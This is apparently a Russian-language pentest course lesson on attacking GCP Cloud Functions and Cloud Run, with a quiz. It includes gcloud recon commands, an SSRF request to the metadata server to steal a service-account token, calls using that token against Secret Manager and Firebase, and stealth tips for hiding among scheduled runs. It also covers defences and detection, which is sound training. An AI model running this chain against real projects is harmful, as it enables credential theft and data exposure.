---
id: cloud-gcp-functions
title: "Cloud Functions и Cloud Run: инъекции и захват service account"
category: cloud
parent: cloud-gcp-deep
difficulty: hard
order: 2
tags: [cloud, gcp, cloud-functions, cloud-run, serverless, sa, injection]
prerequisites: [cloud-gcp-deep, cloud-gcp-metadata]
useful_for:
  - "Пентест серверлесс-нагрузок GCP"
  - "Захват runtime service account"
  - "Инъекции через источники событий"
estimated_minutes: 50
summary: "Как устроены Cloud Functions (1st/2nd gen) и Cloud Run, как находить публичные эндпоинты, инъекции и слабые права, и как из функции/сервиса захватить runtime service account и данные."
---

## Зачем этот урок

Cloud Functions и Cloud Run — серверлесс-платформы GCP. Функция/сервис исполняется под **runtime service account**, имеет доступ к metadata-сервису и часто к Secret Manager, Storage и БД. Если эндпоинт публичный (`allUsers` с `roles/run.invoker` или `roles/cloudfunctions.invoker`) или в коде есть инъекция, атакующий получает выполнение в контексте этого SA. Плюс серверлесс-конфигурации часто раскрывают секреты: переменные окружения, исходники в Cloud Storage, логи Cloud Build. Этот урок — про разведку функций и Cloud Run, поиск публичных эндпоинтов, инъекции в источники событий и захват сервисного аккаунта.

## Как устроены Cloud Functions и Cloud Run

- **Cloud Functions 1st gen** — функция с триггером (HTTP, Pub/Sub, Storage, Firestore, Scheduler). Код в Cloud Storage, сборка через Cloud Build. Runtime SA задаётся при деплое.
- **Cloud Functions 2nd gen** — построена на Cloud Run; больше возможностей (concurrency, большие таймауты), URL вида `*.run.app`.
- **Cloud Run** — контейнерный сервис. Ревизии (`revision`), трафик, `--allow-unauthenticated`. Каждая ревизия — образ в Artifact Registry.
- **Runtime service account** — идентичность исполнения; креды доступны через metadata (`cloud-gcp-metadata`).
- **Ingress** — настройка, откуда доступен сервис (`all`, `internal`, `internal-and-cloud-load-balancing`).
- **Sources bucket** — 1st gen хранит исходники в `gcf-sources-*`; при слабых правах их можно прочитать.

Опасные конфигурации:

- `allUsers` как invoker — публичный вызов без аутентификации.
- Runtime SA с широкими ролями (`Editor`, `Owner`, `secretmanager.secretAccessor` на всё).
- Секреты в переменных окружения (`--set-env-vars`), видимые в описании функции.
- Ingress `all` для внутренних сервисов.
- Устаревшие ревизии с доступом.

## Инструменты и команды

Разведка:

```bash
# Список функций и их конфигурация
gcloud functions list
gcloud functions describe myfunc --region europe-west1 \
  --format='value(serviceConfig.uri,serviceAccountEmail,ingressSettings,environmentVariables)'

# Cloud Run: сервисы и их IAM-политики
gcloud run services list
gcloud run services get-iam-policy myservice --region europe-west1
gcloud run services describe myservice --region europe-west1 \
  --format='value(spec.template.spec.serviceAccountName,status.url,metadata.annotations)'
```

Публичность:

```bash
# Кто может вызывать
gcloud run services get-iam-policy myservice --region europe-west1 \
  --format=json | jq '.bindings[] | select(.role=="roles/run.invoker")'
```

Вызов:

```bash
# Если публичный — без токена
curl -s https://myservice-abc-ew.a.run.app/
# Если нужен id token
curl -s -H "Authorization: Bearer $(gcloud auth print-identity-token)" https://myservice-abc-ew.a.run.app/
```

## Разобранный пример: от публичного Cloud Run к токену SA

Сценарий: найден публичный Cloud Run сервис, у которого есть уязвимость (например, SSRF или инъекция команды в параметре).

Шаг 1 — подтверждаем публичность и находим runtime SA:

```bash
gcloud run services describe shop-api --region europe-west1 \
  --format='value(spec.template.spec.serviceAccountName)'
# shop-api@my-project.iam.gserviceaccount.com
```

Шаг 2 — проверяем, что SA — не дефолтный compute (часто с широкими правами):

```bash
gcloud iam service-accounts describe shop-api@my-project.iam.gserviceaccount.com
```

Шаг 3 — эксплуатируем инъекцию. Например, параметр `url` уходит в `requests.get`:

```
GET https://shop-api-abc.a.run.app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Если SSRF умеет заголовки, получаем JSON с `access_token`. Если нет — ищем другой путь (см. `cloud-gcp-metadata`).

Шаг 4 — используем токен:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://my-project.firebaseio.com/.json"   # Firestore/RTDB, если права есть
```

Шаг 5 — исходники. В 1st gen исходники лежат в бакете; если у вашего SA есть `storage.objects.get`, читаем код и находим другие секреты/эндпоинты:

```bash
gsutil ls gs://gcf-sources-*/ 2>/dev/null
gsutil cat gs://gcf-sources-*/function-*/main.py 2>/dev/null | head -60
```

Шаг 6 — проверяем имперсонацию (`getAccessToken`) — это ускоряет эскалацию.

## Варианты атак и обходы

- **Публичные эндпоинты.** `allUsers` invoker — прямой вызов. Ищите сервисы через поиск по `*.run.app` и `cloudfunctions.net` в scope.
- **Инъекции в источники событий.** Если функция подписана на Pub/Sub или Storage, атакующий с правом `pubsub.topics.publish` или `storage.objects.create` может подсунуть событие с произвольным payload; функция обработает его в своём контексте (`cloud-serverless-injection`).
- **Переменные окружения.** `--set-env-vars` видны в `describe`; часто там API-ключи, строки подключения, токены.
- **Секреты как env из Secret Manager.** Функция может получать секрет через `--set-secrets`; если вы можете вызвать функцию, которая его печатает, — получите секрет.
- **Ingress `all` + слабая авторизация.** Внутренний сервис, доступный из интернета, обходится напрямую.
- **Artifact Registry.** Ревизии Cloud Run ссылаются на образы; при праве на чтение репозитория вы скачаете образ и найдёте секреты внутри (`cloud-artifact-registry`).
- **Cloud Build logs.** Логи сборки могут содержать команды, пути и секреты.
- **Обратная функция.** Если есть `cloudfunctions.functions.setIamPolicy`, вы можете сами сделать функцию публичной или назначить invoker.

## Частые ошибки и подводные камни

- **Путать 1st и 2nd gen.** У них разные URL, API и расположение исходников.
- **Не проверять ingress.** Сервис может быть `internal`, и вызов снаружи не пройдёт — но из другого ресурса в VPC пройдёт.
- **Считать «нет env» безопасным.** Секреты могут подтягиваться через `--set-secrets` в рантайме.
- **Забывать про ревизии.** Cloud Run хранит историю ревизий; старая ревизия с широкими правами может всё ещё существовать.
- **Игнорировать Cloud Scheduler.** Он может дёргать эндпоинты по расписанию — это дополнительный источник событий.
- **Ошибка на identity token.** Для приватного Cloud Run нужен **identity token** (`gcloud auth print-identity-token`), а не access token.

## Защита и детект

- **Уберите `allUsers`.** Для приватных сервисов используйте IAM invoker и аутентификацию.
- **Минимальный runtime SA.** Отдельный SA на функцию, без Editor/Owner, без `secretAccessor` на всё.
- **Секреты через Secret Manager**, не через env; ротация.
- **Ingress `internal`** для внутренних сервисов.
- **Детект.** Cloud Audit Logs: `SetIamPolicy`, `UpdateService`, `google.cloud.run.v1.Services.ReplaceService`, `SecretManager.AccessSecretVersion`. Алерты на изменение IAM-политики Cloud Run/Functions, на всплеск вызовов, на чтение многих секретов.
- **Binary Authorization** для контроля образов; VPC-SC для ограничения egress.

## Cloud Run: ревизии, трафик и обход

Cloud Run — это «функция как контейнер», и у него есть несколько атакующих особенностей:

- **Ревизии.** Каждое развёртывание создаёт неизменяемую ревизию. Старые ревизии продолжают существовать и могут быть доступны по тегу, если настроен traffic splitting. Если старая ревизия имела широкий SA или открытый эндпоинт — это цель.
- **Traffic splitting.** Можно направить часть трафика на конкретную ревизию (`gcloud run services update-traffic`). При наличии `run.services.update` вы можете вернуть старую (уязвимую) ревизию в ротацию.
- **Теги ревизий.** `gcloud run services update-traffic --set-tags=old=myservice-old` даёт стабильный URL ревизии.
- **Конкурентность и таймауты.** Долгие запросы могут использоваться для отладки; по умолчанию Cloud Run масштабируется до нуля, но при `min-instances` экземпляр живёт постоянно.
- **Sidecar и volume mounts.** Cloud Run (gen2) поддерживает монтирование секретов как файлов; если вы внутри — читайте `/etc/secrets` и переменные окружения.
- **VPC connector.** Если сервис подключён к VPC connector, из него достижимы внутренние ресурсы — это pivot в приватную сеть.

Обход аутентификации: если сервис «приватный», но вы можете получить identity token любого SA с правом `run.invoker` (например, через имперсонацию), вызов пройдёт. Поэтому `getAccessToken`/`generateIdToken` — ключевые права для атаки на Cloud Run.

## Сравнение GCP serverless с AWS и Azure

| Аспект | GCP | AWS | Azure |
|--------|-----|-----|-------|
| Платформы | Cloud Functions, Cloud Run | Lambda, App Runner | Functions, Container Apps |
| Идентичность | runtime SA (metadata) | Lambda execution role (env) | Managed identity (IMDS) |
| Публичный вызов | `allUsers` + invoker | Function URL + resource policy | authLevel anonymous |
| Секреты | Secret Manager, env | env, Secrets Manager | Key Vault, app settings |
| Событийные триггеры | Pub/Sub, Storage, Eventarc | SQS, S3, EventBridge | Event Grid, Service Bus |
| Имперсонация | `getAccessToken` | `sts:AssumeRole` | OAuth2 token exchange |

Понимание аналогий помогает переносить техники: инъекция в событие, публичный эндпоинт и кража runtime-идентичности есть во всех трёх облаках, но конкретный способ получить идентичность различается.

## OPSEC и заметность серверлесс-атак

Serverless-атаки заметны по-разному. Вызов публичного эндпоинта фиксируется в логах самого сервиса и в Cloud Run request logs; чтение Secret Manager — в Cloud Audit Logs; имперсонация — в `GenerateAccessToken` событиях. Если вы эксплуатируете инъекцию, ваш ввод останется в логах приложения. Практические соображения: используйте существующие эндпоинты вместо развёртывания своих, не включайте verbose-логи, минимизируйте число вызовов Secret Manager (каждое `AccessSecretVersion` логируется). Если функция вызывается по расписанию Cloud Scheduler, можно «спрятать» действие среди легитимных запусков, но это не устраняет запись. Помните, что для пентеста важен воспроизводимый путь, а не скрытность любой ценой.

## Что дальше / решение

Публичный Cloud Run/Functions — это либо прямой доступ к данным, либо точка для инъекции. После захвата runtime SA: проверьте Secret Manager, Storage, Firestore, имперсонацию. Если функция реагирует на события — ищите способ подсунуть событие. Читайте исходники из `gcf-sources-*` и образы из Artifact Registry: там часто лежат ключи. Стройте цепочку от сервиса к SA и от SA — к проекту. Помните про scopes и про то, что SA может имперсонировать другие SA.

## Квиз

```quiz
- question: "Что означает роль roles/run.invoker для allUsers?"
  options:
    - "Сервис Cloud Run можно вызвать без аутентификации"
    - "Только администратор может вызвать"
    - "Сервис отключён"
    - "Сервис доступен только из VPC"
  answer: 0
  explanation: "allUsers + run.invoker делает сервис публичным."
- question: "Под какой идентичностью исполняется Cloud Run сервис?"
  options:
    - "Под runtime service account, заданным в шаблоне"
    - "Под вашим личным аккаунтом"
    - "Под анонимным пользователем"
    - "Под node SA всегда"
  answer: 0
  explanation: "Ревизия запускается от имени указанного service account."
- question: "Где в Cloud Functions 1st gen лежат исходники?"
  options:
    - "В бакете gcf-sources-* в Cloud Storage"
    - "В Secret Manager"
    - "В Firestore"
    - "В Artifact Registry"
  answer: 0
  explanation: "Исходники 1st gen хранятся в gcf-sources-бакете."
- question: "Какой токен нужен для вызова приватного Cloud Run?"
  options:
    - "Identity token (OIDC)"
    - "Access token OAuth"
    - "API-ключ"
    - "SAS-токен"
  answer: 0
  explanation: "Приватный Cloud Run требует OIDC identity token с aud сервиса."
```

## Где пригодится

- **Пентест GCP:** серверлесс-нагрузки и их SA.
- **Bug bounty:** публичные `*.run.app` и `cloudfunctions.net`.
- **Red team:** захват SA и эскалация.
- **Blue team:** аудит IAM-политик сервисов и секретов.
